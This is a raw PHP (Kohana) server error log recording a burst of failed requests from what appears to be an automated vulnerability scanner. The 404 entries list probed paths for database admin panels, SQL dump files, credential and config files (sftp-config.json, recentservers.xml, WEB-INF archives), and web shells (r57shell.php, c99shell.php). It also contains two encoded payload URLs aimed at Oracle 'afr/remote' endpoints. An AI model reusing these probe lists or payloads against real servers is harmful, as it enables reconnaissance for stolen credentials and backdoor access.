2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Trace.axd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dbadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dbadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF (copy)/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF (copy)/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL mysqladmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL mysqladmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL core was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL core was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF - Copy/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF - Copy/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL PMA was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL PMA was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Copy of WEB-INF/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Copy of WEB-INF/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webcenter/afr/trkga/remote/H4sIAAAAAAAACnWMsUoDQRCGJ16OXCSFWlikFGxvg54XooWCEDw4G8XeNbfJrqw36+5E18bH8Cl8CfEJbK1tfQNB98K1_jDDNzD_9_oNsbOwecsfeLokpdMz7uQ5N3Hv8+19+_ojgrUprGvk1ZTPCG0BfZJWOIm68ub4BJoMHpOwN8J0gmywktWC0quL8mV3nA9_vmwEvQISGeSnWIkCugYtldDnS5JoFT0RbJVNkWleL9glWVUvjkrozpUW9_AMUWCJjlpOjEXCGer2jqyYr9Cb3zYEQ6loMtofZXv5+GCSZ6LK0hvvXHonCDqs+Y8paImM8QQ7DRwy9n+L+T+nR_oBMQEAAA== was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webcenter/afr/trkga/remote/H4sIAAAAAAAACnWMsUoDQRCGJ16OXCSFWlikFGxvg54XooWCEDw4G8XeNbfJrqw36+5E18bH8Cl8CfEJbK1tfQNB98K1_jDDNzD_9_oNsbOwecsfeLokpdMz7uQ5N3Hv8+19+_ojgrUprGvk1ZTPCG0BfZJWOIm68ub4BJoMHpOwN8J0gmywktWC0quL8mV3nA9_vmwEvQISGeSnWIkCugYtldDnS5JoFT0RbJVNkWleL9glWVUvjkrozpUW9_AMUWCJjlpOjEXCGer2jqyYr9Cb3zYEQ6loMtofZXv5+GCSZ6LK0hvvXHonCDqs+Y8paImM8QQ7DRwy9n+L+T+nR_oBMQEAAA== was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: application.wadl ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: application.wadl ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL myadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL myadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Gemfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Gemfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL phpmyadmin2 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL phpmyadmin2 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gemfile.lock ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gemfile.lock ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL phpMyAdmin2 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL phpMyAdmin2 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL bicomposer/afr/njewo/remote/H4sIAAAAAAAACnWMvUoDQRDHJ16OXCSFWlikFGx3zQfGj0JBCB6cjWLverfJnqw36+4kro2P4VP4EuIT2Frb+gaC7oVr_cMMv4H5_16_IXYWNu_EUrAFlZqdC6cuhIk7n2_v2zcfEaxNYV2jKKYiJ7QpdElZ6RTqwpuTU6jTe0zC3gjTCrLeSlZJYteX2cvuZL__82Uj6KSQqCA_w0Km0DZoKYOuWJBCW9ITwVZWF7kW1ZxfkS2r+XEG7Vmp5QM8QxRYoaOGE2ORMEfd3JGVsxV689uEoK9KGg72xqOD4XgyEKPDPGe33jl2LwlavP6PKWiJjPEEOzUccf5_i_s_k+dN8DEBAAA= was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL bicomposer/afr/njewo/remote/H4sIAAAAAAAACnWMvUoDQRDHJ16OXCSFWlikFGx3zQfGj0JBCB6cjWLverfJnqw36+4kro2P4VP4EuIT2Frb+gaC7oVr_cMMv4H5_16_IXYWNu_EUrAFlZqdC6cuhIk7n2_v2zcfEaxNYV2jKKYiJ7QpdElZ6RTqwpuTU6jTe0zC3gjTCrLeSlZJYteX2cvuZL__82Uj6KSQqCA_w0Km0DZoKYOuWJBCW9ITwVZWF7kW1ZxfkS2r+XEG7Vmp5QM8QxRYoaOGE2ORMEfd3JGVsxV689uEoK9KGg72xqOD4XgyEKPDPGe33jl2LwlavP6PKWiJjPEEOzUccf5_i_s_k+dN8DEBAAA= was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.7z ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.7z ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gruntfile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gruntfile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-backup.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/pma was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/pma was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.rar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.rar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: gruntFile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: gruntFile.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup-34.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup-34.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/phpmyadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/phpmyadmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gruntfile.coffee ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Gruntfile.coffee ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _mmServerScripts/MMHTTPDB.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _mmServerScripts/MMHTTPDB.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF.tar ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: GruntFile.coffee ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: GruntFile.coffee ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup_34.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup_34.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _mmServerScripts/MMHTTPDB.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _mmServerScripts/MMHTTPDB.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/mysql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/mysql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sftp-config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sftp-config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Rakefile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Rakefile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: recentservers.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: recentservers.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Dockerfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Dockerfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: package.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: package.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.ru ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.ru ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpinfo.php5 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpinfo.php5 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r57shell.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r57shell.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webadmin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.rb ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.rb ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pi.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pi.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r57.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r57.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: compass.rb ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: compass.rb ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pi.php5 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pi.php5 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.28.184.113-dump.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r58.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r58.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Vagrantfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Vagrantfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: c99shell.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: c99shell.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: i.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
